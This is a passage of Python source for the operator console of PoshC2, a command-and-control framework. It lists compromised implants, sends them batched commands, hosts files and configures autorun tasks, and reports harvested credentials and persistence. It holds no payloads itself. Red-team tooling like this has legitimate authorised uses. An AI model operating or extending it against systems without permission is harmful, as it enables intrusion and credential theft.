import argparse
import os
import re
import signal
import subprocess
import sys
import traceback
from datetime import datetime, timedelta, date, timezone

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style
from rich.console import Console
from rich.table import Table
from tzlocal import get_localzone

from poshc2 import Colours
from poshc2.Utils import no_yes_prompt, validate_timestamp_string, command, get_command_word
from poshc2.Utils import validate_sleep_time, parse_creds, validate_kill_date, string_to_array, get_first_url
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.FCommHandler import handle_fcomm_command, fc_prompt
from poshc2.client.command_handlers.JxaHandler import handle_jxa_command, jxa_prompt
from poshc2.client.command_handlers.LinuxHandler import handle_linux_command, nl_prompt
from poshc2.client.command_handlers.PBindHandler import handle_pbind_command, pb_prompt
from poshc2.client.command_handlers.PSHandler import handle_ps_command, ps_prompt
from poshc2.client.command_handlers.PyHandler import handle_py_command, py_prompt
from poshc2.client.command_handlers.SharpHandler import handle_sharp_command, cs_prompt
from poshc2.client.command_handlers.UnmanagedWindowsHandler import handle_unmanaged_windows_command, um_prompt
from poshc2.client.reporting.CSV import generate_csv
from poshc2.client.reporting.HTML import graphviz, generate_html_table
from poshc2.server.Config import PBindPipeName, PBindSecret, FCommFilePath, UserAgent, ReportsDirectory
from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, ModulesDirectory, Database, DatabaseType
from poshc2.server.Core import get_cred_from_params, print_good, print_bad, number_of_days, clear, get_parent_implant
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Helpers import get_mitre_ttps, get_alive_implants, get_implant, get_implant_by_numeric_id, get_creds, get_new_implant_url
from poshc2.server.database.Helpers import insert_object, update_object, delete_object, select_first, select_all
from poshc2.server.database.Model import C2Server, C2Message, NewTask, Task, Cred, Implant, URL, OpsecEntry, HostedFile, AutoRun, MitreTTP
from poshc2.server.payloads.Payloads import Payloads

utcTimezone = timezone(timedelta(hours=0))
local_zone = get_localzone()

server_commands = {}
server_commands_help = {}
server_examples = []
server_block_help = {}

serverAutosuggestor = AutoSuggestFromPoshExamples(server_examples)

style = Style.from_dict({
    '': '#32CD32',
})


def catch_exit(signum, frame):
    sys.exit(0)


def get_implant_type_prompt_prefix(numeric_id):
    if "," in str(numeric_id):
        return ""

    implant = get_implant_by_numeric_id(numeric_id)
    implant_type = ImplantType.get(implant.type)
    return implant_type.value


def show_implants_table(implants, auto_hide):
    table = Table(title="Implants", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
    table.add_column("ID", no_wrap=True, min_width=5, justify="center")
    table.add_column("Last Seen (UTC)", no_wrap=True, min_width=16, justify="center")
    table.add_column("Process Name", no_wrap=True, justify="center")
    table.add_column("PID", no_wrap=True, justify="center")
    table.add_column("Sleep", no_wrap=True, width=7, justify="center")
    table.add_column("Comms ID", no_wrap=True, justify="center")
    table.add_column("Context", no_wrap=True, min_width=20, justify="center")
    table.add_column("Arch", no_wrap=True, justify="center")
    table.add_column("Type", no_wrap=True, min_width=6, justify="center")
    table.add_column("Label", no_wrap=True, min_width=13, justify="center")

    for implant in implants:
        implant_type = ImplantType.get(implant.type)
        implant_label = implant.label

        if implant_type.is_pbind_implant() or implant_type.is_fcomm_implant():
            sleep_implant = get_parent_implant(implant.id)
            if sleep_implant is None:
                sleep_implant = implant
        else:
            sleep_implant = implant

        utc_timezone = timezone(timedelta(hours=0))
        last_seen_time = datetime.strptime(sleep_implant.last_seen, "%Y-%m-%d %H:%M:%S")
        last_seen_time = last_seen_time.replace(tzinfo=utc_timezone)
        last_seen_time_string = last_seen_time.strftime("%Y-%m-%d %H:%M:%S")
        utc_now = datetime.now(tz=utc_timezone)

        if sleep_implant.sleep.endswith('s'):
            sleep_int = int(sleep_implant.sleep[:-1])
        elif sleep_implant.sleep.endswith('m'):
            sleep_int = int(sleep_implant.sleep[:-1]) * 60
        elif sleep_implant.sleep.endswith('h'):
            sleep_int = int(sleep_implant.sleep[:-1]) * 60 * 60
        else:
            print(Colours.RED)
            print(f"Incorrect sleep format: {sleep_implant.sleep}")
            print(Colours.GREEN)
            continue

        now_minus_3_beacons = utc_now - timedelta(seconds=(sleep_int * 3))
        now_minus_10_beacons = utc_now - timedelta(seconds=(sleep_int * 10))
        now_minus_30_beacons = utc_now - timedelta(seconds=(sleep_int * 30))
        id_string = str(implant.numeric_id)

        if not implant_label:
            implant_label = ""
        else:
            implant_label = implant_label.strip()
            implant_label = f"[blue]{implant_label}[/blue]"

        context = f"{implant.domain}\\{implant.user} @ {implant.hostname}"

        if "*" in context or "#" in context:
            context = f"[green]{context}[/green]"

        architecture = implant.architecture

        if implant_type.is_pbind_implant():
            comms = f"[blue]PBind[/blue]"
        elif implant_type.is_fcomm_implant():
            comms = f"[purple]FComm[/purple]"
        else:
            comms = str(implant.url_id)

        if implant_type.is_pbind_implant() or implant_type.is_fcomm_implant():
            if implant.label == "Parent: Unlinked":
                table.add_row(id_string, f"[bold red]{last_seen_time_string}[/bold red]", implant.process_name, str(implant.process_id), implant.sleep,
                          comms, context, architecture, implant_type.value, implant_label)
            else:
                table.add_row(id_string, last_seen_time_string, implant.process_name, str(implant.process_id), implant.sleep, comms, context, architecture, implant_type.value,
                          implant_label)
        elif now_minus_30_beacons > last_seen_time and auto_hide:
            pass
        elif now_minus_10_beacons > last_seen_time:
            table.add_row(id_string, f"[bold red]{last_seen_time_string}[/bold red]", implant.process_name, str(implant.process_id), implant.sleep,
                          comms, context, architecture, implant_type.value, implant_label)
        elif now_minus_3_beacons > last_seen_time:
            table.add_row(id_string, f"[bold yellow]{last_seen_time_string}[/bold yellow]", implant.process_name, str(implant.process_id), implant.sleep,
                          comms, context, architecture, implant_type.value, implant_label)
        else:
            table.add_row(id_string, last_seen_time_string, implant.process_name, str(implant.process_id), implant.sleep, comms,
                          context, architecture, implant_type.value, implant_label)

    if table.row_count > 0:
        console = Console()
        print(Colours.END)
        console.print(table)
        return True
    return False


def implant_handler_command_loop(user, help_text="", auto_hide=None):
    while True:
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.server-history'),
                                auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), serverAutosuggestor]))

        try:
            if user is not None:
                print(f"User: {Colours.BLUE}{user}{Colours.GREEN}")

            c2_server = select_first(C2Server)
            kill_date = datetime.strptime(c2_server.kill_date, '%Y-%m-%d').date()
            date_difference = number_of_days(date.today(), kill_date)

            if date_difference < 8:
                print(Colours.RED + f"\nKill Date is - {c2_server.kill_date} - expires in {date_difference} days" + Colours.END)
                print()

            implants = get_alive_implants()

            if implants:
                no_implants = not show_implants_table(implants, auto_hide)
            else:
                no_implants = True

            if no_implants:
                utc_now = datetime.now(timezone.utc)
                print(Colours.RED + f"\nNo Implants as of: {utc_now.strftime('%Y-%m-%d %H:%M:%S')}")

            if help_text:
                print(help_text)

            completions = list(server_commands.keys())
            completions.extend(server_examples)
            command = session.prompt("\n> Select Implant ID(s) or 'all' (Enter to refresh):: ", completer=FirstWordCompleter(completions, WORD=True))
            print("")

            command = command.strip()

            if command == "" or command == "back":
                clear()
                continue

            command_word = get_command_word(command)

            if command_word in server_commands:
                server_commands[command_word](user, command)
            else:
                implant_command_loop(command, user)

        except KeyboardInterrupt:
            clear()
            continue
        except EOFError:
            now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            c2_message = C2Message(
                message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
                read="No"
            )

            insert_object(c2_message)
            sys.exit(0)
        except Exception as e:
            if 'unable to open database file' not in str(e):
                print_bad(f"Error: {e}")
                print(Colours.END)
                # traceback.print_exc()
                input("Press Enter to continue...")
                clear()


def run_implant_command(command, implant_id, user, handler_numeric_id):
    implant = get_implant(implant_id)
    implant_type = ImplantType.get(implant.type)

    if implant_type.is_python_implant():
        handle_py_command(command, user, implant_id)
        return
    elif implant_type.is_pbind_implant():
        handle_pbind_command(command, user, implant_id, handler_numeric_id)
        return
    elif implant_type.is_fcomm_implant():
        handle_fcomm_command(command, user, implant_id, handler_numeric_id)
        return
    elif implant_type.is_sharp_implant():
        handle_sharp_command(command, user, implant_id)
        return
    elif implant_type.is_jxa_implant():
        handle_jxa_command(command, user, implant_id)
        return
    elif implant_type.is_linux_implant():
        handle_linux_command(command, user, implant_id)
        return
    elif implant_type.is_unmanaged_implant():
        handle_unmanaged_windows_command(command, user, implant_id)
        return
    elif implant_type.is_powershell_implant():
        handle_ps_command(command, user, implant_id)
        return
    else:
        raise f"Unknown implant type: {implant_type}"


def implant_command_loop(numeric_id, user):
    while True:
        print()

        try:
            if ("-" in numeric_id) or ("all" in numeric_id) or ("," in numeric_id):
                command = ps_prompt(numeric_id)

                if command == "back":
                    clear()
                    return
            else:
                implant = get_implant_by_numeric_id(numeric_id)

                if not implant:
                    print_bad(f"Unrecognised implant id or command: {numeric_id}")
                    print(Colours.END)
                    input("Press Enter to continue...")
                    clear()
                    return

                print(f"{Colours.GREEN}{implant.domain}\\{implant.user} @ {implant.hostname} (PID:{implant.process_id}){Colours.END}")

                # TODO refactor
                prefix = f"{get_implant_type_prompt_prefix(numeric_id)} {numeric_id}"
                implant_type = ImplantType.get(implant.type)

                if implant_type.is_python_implant():
                    command = py_prompt(prefix)
                elif implant_type.is_pbind_implant():
                    command = pb_prompt(prefix)
                elif implant_type.is_fcomm_implant():
                    command = fc_prompt(prefix)
                elif implant_type.is_sharp_implant():
                    command = cs_prompt(prefix)
                elif implant_type.is_unmanaged_implant():
                    command = um_prompt(prefix)
                elif implant_type.is_powershell_implant():
                    command = ps_prompt(prefix)
                elif implant_type.is_linux_implant():
                    command = nl_prompt(prefix)
                elif implant_type.is_jxa_implant():
                    command = jxa_prompt(prefix)
                else:
                    raise f"Unrecognised implant type: {implant.type}"
                if command == "back":
                    clear()
                    return

            # if "all" run through all implants get_implants()
            if numeric_id == "all":
                if command == "back":
                    clear()
                    return

                all_commands = command
                confirm = "n"

                if "\n" in command:
                    confirm = input("Do you want to run commands separately? (Y/n) ")

                implants = get_alive_implants()

                if implants:
                    for implant in implants:
                        # if "\n" in command run each command individually or ask the question if that's what they want to do
                        if "\n" in all_commands:
                            if confirm.lower() == "y" or confirm == "":
                                commands = all_commands.split('\n')

                                for command in commands:
                                    run_implant_command(command, implant.id, user, implant.numeric_id)
                            else:
                                run_implant_command(command, implant.id, user, implant.numeric_id)
                        else:
                            run_implant_command(command, implant.id, user, implant.numeric_id)

            # if "separated list" against single uri
            # TODO refactor
            elif "," in numeric_id:
                all_commands = command
                confirm = "n"

                if "\n" in command:
                    confirm = input("Do you want to run commands separately? (Y/n) ")

                implant_split = numeric_id.split(",")

                for split_implant_id in implant_split:
                    implant = get_implant_by_numeric_id(split_implant_id)

                    # if "\n" in command run each command individually or ask the question if that's what they want to do
                    if "\n" in all_commands:
                        if confirm.lower() == "y" or confirm == "":
                            commands = all_commands.split('\n')

                            for command in commands:
                                run_implant_command(command, implant.id, user, split_implant_id)
                        else:
                            run_implant_command(command, implant.id, user, split_implant_id)
                    else:
                        run_implant_command(command, implant.id, user, split_implant_id)

            # if "range" against single uri
            elif "-" in numeric_id:
                all_commands = command
                confirm = "n"

                if "\n" in command:
                    confirm = input("Do you want to run commands separately? (Y/n) ")

                try:
                    implant_split = numeric_id.split("-")

                    for range_implant_id in range(int(implant_split[0]), int(implant_split[1]) + 1):
                        implant = get_implant_by_numeric_id(range_implant_id)

                        # if "\n" in command run each command individually or ask the question if that's what they want to do
                        if "\n" in all_commands:
                            if confirm.lower() == "y" or confirm == "":
                                commands = all_commands.split('\n')

                                for command in commands:
                                    run_implant_command(command, implant.id, user, range_implant_id)
                            else:
                                run_implant_command(command, implant.id, user, range_implant_id)
                        else:
                            run_implant_command(command, implant.id, user, range_implant_id)
                except Exception:
                    traceback.print_exc()
                    print_bad("Unknown Implant ID")

            # else run against single id
            else:
                all_commands = command
                confirm = "n"

                if "\n" in command:
                    confirm = input("Do you want to run commands separately? (Y/n) ")

                implant = get_implant_by_numeric_id(numeric_id)

                # if "\n" in command run each command individually or ask the question if that's what they want to do
                if "\n" in all_commands:
                    if confirm.lower() == "y" or confirm == "":
                        commands = all_commands.split('\n')

                        for command in commands:
                            run_implant_command(command, implant.id, user, numeric_id)
                    else:
                        run_implant_command(command, implant.id, user, numeric_id)
                else:
                    run_implant_command(command, implant.id, user, numeric_id)

        except KeyboardInterrupt:
            continue
        except EOFError:
            now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
            c2_message = C2Message(
                message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
                read="No"
            )

            insert_object(c2_message)
            sys.exit(0)
        except Exception as e:
            traceback.print_exc()
            print_bad(f"Error running against the selected implant ID, ensure you have typed the correct information: {e}")
            return


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_generate_reports(user, command):
    """
    Generate HTML and CSV reports.

    Reports are generated to the reports directory in the project.

    Examples:
        generate-reports
    """
    try:
        print("HTML reports:")
        generate_html_table(Task)
        # generate_html_table(C2Server) TODO: report is broken
        generate_html_table(Cred)
        generate_html_table(Implant)
        generate_html_table(URL)
        generate_html_table(OpsecEntry)
        generate_html_table(MitreTTP)
        print()
        graphviz()
        print("CSV reports:")
        generate_csv(Task)
        generate_csv(C2Server)
        generate_csv(Cred)
        generate_csv(Implant)
        generate_csv(URL)
        generate_csv(OpsecEntry)
        generate_csv(MitreTTP)
        generate_opsec(user, command)
    except PermissionError as e:
        print_bad(str(e))
        print(Colours.END)

    input("\nPress Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_generate_csvs(user, command):
    """
    Generate CSV reports only.

    Reports are generated to the reports directory in the project.

    Examples:
        generate-csvs
    """
    try:
        generate_csv(Task)
        generate_csv(C2Server)
        generate_csv(Cred)
        generate_csv(Implant)
        generate_csv(URL)
        generate_csv(OpsecEntry)
        generate_csv(MitreTTP)
    except PermissionError as e:
        print_bad(str(e))

    input("\nPress Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_message(user, command):
    """
    Broadcast a message to all users, appearing in the C2Server log.

    Examples:
        message going for lunch
    """
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    message = command[len("message "):]
    c2_message = C2Message(
        message=f"\n{Colours.BLUE}{now}: Message from {user} - {message}{Colours.END}\n",
        read="No"
    )

    insert_object(c2_message)
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_urls(user, command):
    """
    Show all comms URL information, allowing the URLID to be linked to a name and URL details.

    Examples:
        show-urls
    """
    urls = select_all(URL)

    if urls:
        table = Table(title="Comms URLS", show_lines=True, pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("ID", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Name", no_wrap=True, justify="center", vertical="middle")
        table.add_column("URL", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Host Header", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Proxy URL", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Proxy Username", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Proxy Password", no_wrap=True, justify="center", vertical="middle")
        table.add_column("Credential Expiry", no_wrap=True, justify="center", vertical="middle")

        for url in urls:
            table.add_row(str(url.id), url.name, "\n".join(url.url.split(",")), "\n".join(url.host_header.split(",")), url.proxy_url, url.proxy_username, url.proxy_password, url.credential_expiry)

        console = Console()
        print(Colours.END)
        console.print(table)
        print()
    else:
        print_bad("No URLs were set.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_opsec_events(user, command):
    """
    List all OPSEC events and their details.

    Examples:
        show-opsec-events
    """
    entries = select_all(OpsecEntry)

    if entries:
        table = Table(title="OpSec Events", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("ID", no_wrap=True, justify="center")
        table.add_column("Date", no_wrap=True, justify="center")
        table.add_column("Owner", no_wrap=True, justify="center")
        table.add_column("Event", no_wrap=True, justify="center")
        table.add_column("Note", no_wrap=True, justify="center")

        for entry in entries:
            table.add_row(str(entry.id), entry.date, entry.owner, entry.event, entry.note)

        console = Console()
        print(Colours.END)
        console.print(table)
        print()
    else:
        print_bad("No opsec events found.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_delete_opsec_event(user, command):
    """
    Delete a specific OPSEC event.

    If no Event ID is provided then the user will be prompted for one.

    Examples:
        delete-opsec-event
        delete-opsec-event 2
    """
    if command.lower() == "delete-opsec-event":
        opsec_entry_id = input("Enter Opsec Event ID: ")
        print()

    else:
        opsec_entry_id = command.lower().replace("delete_opsec_event ", "")

    delete_object(OpsecEntry, {OpsecEntry.id: opsec_entry_id})
    print_good(f"Opsec Event was successfully removed.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_add_opsec_event(user, command):
    """
    Insert an OPSEC event.

    An OPSEC event is an event that the operator wishes to track and have reported.

    The user will be prompted for details.

    A timestamp can be provided or the current timestamp is used if none is specified.

    The event and any further notes can then be added and will be displayed in the opsec
    command and in reports.

    Examples:
        add-opsec-event
    """
    opsec_timestamp_format = "%Y-%m-%d %H:%M"
    timestamp_string = datetime.now(timezone.utc).strftime(opsec_timestamp_format)
    timestamp = input(f"Timestamp: (Press Enter for {timestamp_string}) ").strip()

    if not timestamp:
        timestamp = timestamp_string

    if not validate_timestamp_string(timestamp, opsec_timestamp_format):
        print_bad("Please enter a valid timestamp in format yyyy-mm-dd HH:MM")
        print(Colours.END)
        input("Press Enter to continue...")
        clear()
        return

    event = input("Event: ")
    note = input("Notes: ")
    opsec_entry = OpsecEntry(
        date=timestamp,
        owner=user,
        event=event,
        note=note
    )

    insert_object(opsec_entry)
    print_good(f"\nOpsec event was successfully added.{Colours.END}")
    do_get_opsec_events(user, command)


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_hosted_files(user, command):
    """
    List the files hosted on the C2 webserver and their details.

    Examples:
        show-hosted-files
    """
    hosted_files = select_all(HostedFile)

    if hosted_files:
        table = Table(title="Hosted Files", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("ID", no_wrap=True, justify="center")
        table.add_column("URI", no_wrap=True, justify="center")
        table.add_column("File Path", no_wrap=True, justify="center")
        table.add_column("Content Type", no_wrap=True, justify="center")
        table.add_column("Base64", no_wrap=True, justify="center")
        table.add_column("Active", no_wrap=True, justify="center")

        for hosted_file in hosted_files:
            table.add_row(str(hosted_file.id), hosted_file.uri, hosted_file.file_path, hosted_file.content_type, hosted_file.base64, hosted_file.active)

        console = Console()
        print(Colours.END)
        console.print(table)
        print()
    else:
        print_bad("No files hosted on the C2 web server.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_add_hosted_file(user, command):
    """
    Add a file to be hosted by the C2 webserver.

    The operator will be prompted for details.

    Allows a Content-Type to be specified and an option is provided to base64 encode
    the file before serving it.

    Examples:
        add-hosted-file
    """
    FilePath = input("File Path: .e.g. /tmp/application.docx: ")
    URI = input("URI Path: .e.g. /downloads/2020/application: ")
    ContentType = input("Content Type: .e.g. (text/html): ")

    if ContentType == "":
        ContentType = "text/html"

    Base64 = no_yes_prompt("Base64 Encode File")

    if not Base64:
        Base64 = "No"
    else:
        Base64 = "Yes"

    if not URI or not FilePath:
        print_bad("File Path or URI was not specified.")
        print(Colours.END)
        input("Press Enter to continue...")
        clear()
        return

    hosted_file = HostedFile(
        uri=URI,
        file_path=FilePath,
        content_type=ContentType,
        base64=Base64,
        active="Yes"
    )

    insert_object(hosted_file)

    FirstURL = get_first_url(select_first(C2Server.payload_comms_host), select_first(C2Server.domain_front_header))
    print_good(f"\nHosted file was successfully added.\n\n{FirstURL}{URI} -> {FilePath} ({ContentType}){Colours.END}\n")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_disable_hosted_file(user, command):
    """
    Disables a hosted file, stopping it from being served by the C2 webserver.

    If no hosted file ID is provided then the operator will be prompted for one.

    Examples:
        disable-hosted-file
        disable-hosted-file 2
    """
    if command.lower() == "disable-hosted-file":
        hosted_file_id = input("Enter hosted file ID: ")
        print()
    else:
        hosted_file_id = command.lower().replace("disable-hosted-file ", "")

    update_object(HostedFile, {HostedFile.active: "No"}, {HostedFile.id: hosted_file_id})
    print_good(f"Hosted file was successfully disabled.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_enable_hosted_file(user, command):
    """
    Enable a hosted file, serving if from the C2 webserver.

    This only has an effect if the file had previously been disabled.

    If no hosted file ID is provided then the operator will be prompted for one.

    Examples:
        enable-hosted-file
        enable-hosted-file 2
    """

    if command.lower() == "enable-hosted-file":
        hosted_file_id = input("Enter hosted file ID: ")
        print()
    else:
        hosted_file_id = command.lower().replace("enable-hosted-file ", "")

    update_object(HostedFile, {HostedFile.active: "Yes"}, {HostedFile.id: hosted_file_id})
    print_good(f"Hosted file was successfully enabled.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_add_autorun(user, command):
    """
    Add a task to be automatically run when a PowerShell implant first connects.

    Examples:
        add-autorun
        add-autorun migrate C:\\Windows\\calc.exe
    """
    if command.lower() == "add-autorun":
        autorun_task = input("Enter autorun task: ")
        print()
    else:
        autorun_task = command.replace("add-autorun ", "")

    autorun = AutoRun(
        task=autorun_task
    )

    insert_object(autorun)
    print_good(f"Autorun was successfully added.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_autoruns(user, command):
    """
    Show the configured autoruns.

    Autoruns are tasks to be automatically run when a PowerShell implant first connects.

    Examples:
        show-autoruns
    """
    autoruns = select_all(AutoRun)

    if autoruns:
        table = Table(title="Autoruns", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
        table.add_column("ID", no_wrap=True, justify="center")
        table.add_column("Task", no_wrap=True, justify="center")

        for autorun in autoruns:
            table.add_row(str(autorun.id), autorun.task)

        console = Console()
        print(Colours.END)
        console.print(table)
        print()
    else:
        print_bad("No configured autoruns.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_delete_autorun(user, command):
    """
    Removes a configured autorun with a specified ID.

    Examples:
        delete-autorun
        delete-autorun 3
    """

    if command.lower() == "delete-autorun":
        autorun_id = input("Enter autorun ID: ")
        print()
    else:
        autorun_id = command.lower().replace("delete-autorun ", "")

    delete_object(AutoRun, {AutoRun.id: autorun_id})
    print_good(f"Autorun was successfully deleted.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_clear_autoruns(user, command):
    """
    Clears all configured autoruns.

    Examples:
        clear-autoruns
    """
    delete_object(AutoRun)
    print_good(f"Autoruns were successfully cleared.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_show_server_info(user, command):
    """
    Shows the C2 server information presently in use.

    Examples:
        show-server-info
    """
    c2_server = select_first(C2Server)

    if c2_server:
        details_formatted = f"Payload Comms Host: {c2_server.payload_comms_host}\nEncryption Key: {c2_server.encryption_key}" \
                            f"\nDomain Front Header: {c2_server.domain_front_header}\nDefault Sleep: {c2_server.default_sleep}" \
                            f"\nKill Date: {c2_server.kill_date}\nGET 404 Response: {c2_server.get_404_response}" \
                            f"\nPosh Project Directory: {c2_server.posh_project_directory}\nHosted File URL: {c2_server.hosted_file_url}" \
                            f"\nDownload URL: {c2_server.download_url}\nProxy URL: {c2_server.proxy_url}\nProxy Username: {c2_server.proxy_username}" \
                            f"\nProxy Password: {c2_server.proxy_password}\nURLs: {c2_server.urls}\nSocks URLs: {c2_server.socks_urls}" \
                            f"\nInsecure: {c2_server.insecure}\nUser Agent: {c2_server.user_agent}\nReferer: {c2_server.referer}" \
                            f"\nPushover API Token: {c2_server.pushover_api_token}\nPushover API User: {c2_server.pushover_api_user}" \
                            f"\nSlack User ID: {c2_server.slack_user_id}\nSlack Channel: {c2_server.slack_channel}" \
                            F"\nSlack Bot Token: {c2_server.slack_bot_token}\nNotifications Enabled: {c2_server.notifications_enabled}"

        print_good(f"{details_formatted}{Colours.END}\n")
    else:
        print_bad("No C2 Server configured.")
        print(Colours.END)

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_disable_notifications(user, command):
    """
    Turns off Pushover notifications.

    Examples:
        enable-notifications
    """
    update_object(C2Server, {C2Server.notifications_enabled: "No"})
    print_good(f"Turned off notifications on new implant.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_enable_notifications(user, command):
    """
    Turns on Pushover notifications.

    Examples:
        disable-notifications
    """
    update_object(C2Server, {C2Server.notifications_enabled: "Yes"})
    print_good(f"Turned on notifications on new implant.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_set_pushover_token(user, command):
    """
    Sets the Pushover Application Token to use for notifications.

    Examples:
        set-pushover-token
        set-pushover-token 00000000000000
    """
    if command.lower() == "set-pushover-token":
        pushover_token = input("Enter Pushover API Token: ")
        print()
    else:
        pushover_token = command.lower().replace("set-pushover-token ", "")

    update_object(C2Server, {C2Server.pushover_api_token: pushover_token})
    print_good(f"Pushover API Token was updated successfully.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_set_pushover_user(user, command):
    """
    Sets the Pushover User Key to use for notifications.

    Examples:
        set-pushover-user
        set-pushover-user 00000000000000
    """
    if command.lower() == "set-pushover-user":
        pushover_user = input("Enter Pushover API User: ")
        print()
    else:
        pushover_user = command.lower().replace("set-pushover-user ", "")

    update_object(C2Server, {C2Server.pushover_api_user: pushover_user})
    print_good(f"Pushover API User was updated successfully.{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_get_kill_date(user, command):
    """
    Get the kill date currently set for the C2 server.

    Examples:
        get-kill-date
    """
    kill_date = select_first(C2Server.kill_date)
    print_good(f"Kill Date: {kill_date}{Colours.END}\n")
    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_set_kill_date(user, command):
    """
    Sets the kill date to use for new payloads and implant only.

    Examples:
        set-kill-date
        set-kill-date 1970-01-01
    """
    if command.lower() == "set-kill-date":
        kill_date = input("Enter new kill date: ")
        print()
    else:
        kill_date = command.lower().replace("set-kill-date ", "")

    if not validate_kill_date(kill_date):
        print_bad("Invalid kill date format, please specify a kill date in format yyyy-MM-dd")
        print(Colours.END)
    else:
        update_object(C2Server, {C2Server.kill_date: kill_date})
        print_good(f"Kill date was updated successfully.\n{Colours.YELLOW}Remember to generate new payloads and get new implants!{Colours.END}\n")

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_set_default_beacon(user, command):
    """
    Sets the default beacon interval for new payloads and implants.

    Examples:
        set-default-beacon
        set-default-beacon 10s
    """
    if command.lower() == "set-default-beacon":
        default_sleep = input("Enter new beacon interval: ")
        print()
    else:
        default_sleep = command.lower().replace("set-default-beacon ", "")

    if not validate_sleep_time(default_sleep):
        print_bad("Invalid beacon interval, please specify a value such as 50s, 10m or 1h")
        print(Colours.END)
    else:
        update_object(C2Server, {C2Server.default_sleep: default_sleep})
        print_good(f"Default beacon interval was updated successfully.{Colours.END}\n")

    input("Press Enter to continue...")
    clear()


@command(server_commands, server_commands_help, server_examples, server_block_help)
def do_opsec(user, command):
    """
    Show OPSEC information automatically extracted from activity, such as URLs in use,
    credentials harvested and so on.

    Examples:
        opsec
    """
    implants = select_all(Implant)
    tasks = select_all(Task)
    urls = select_all(URL)
    users = ""
    hosts = ""
    uploads = ""
    creds = ""
    hashes = ""
    formatted_urls = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"

    for url in (urls or []):
        formatted_urls += f"{url.id}  {url.name}  {url.url}  {url.host_header}  {url.proxy_url}  {url.proxy_username}  {url.proxy_password}  {url.credential_expiry}\n"

    for implant in (implants or []):
        if implant.hostname not in hosts:
            hosts += f"{implant.hostname} \n"

    for task in (tasks or []):
        implant = get_implant(task.implant_id)
        command = task.command.lower()
        output = ""

        if task.output:
            output = task.output.lower()

        if implant.user not in users:
            users += f"{implant.domain}\\{implant.user} @ {implant.hostname}\n"

        if "upload-file" in command:
            uploadinfo = command
            uploadinfo = uploadinfo.partition("upload-file ")[2].strip()
            uploads += f"{implant.domain}\\{implant.user} @ {implant.hostname}, {uploadinfo}\n"

        if "installing persistence" in output:
            line = command.replace('\n', '')
            line = line.replace('\r', '')
            filenameuploaded = line.rstrip().split(":", 1)[1]
            uploads += f"{implant.user} {filenameuploaded} \n"

        if "written scf file" in output:
            uploads += f"{implant.user} {output} \n"

        creds, hashes = parse_creds(select_all(Cred))

    print_good(
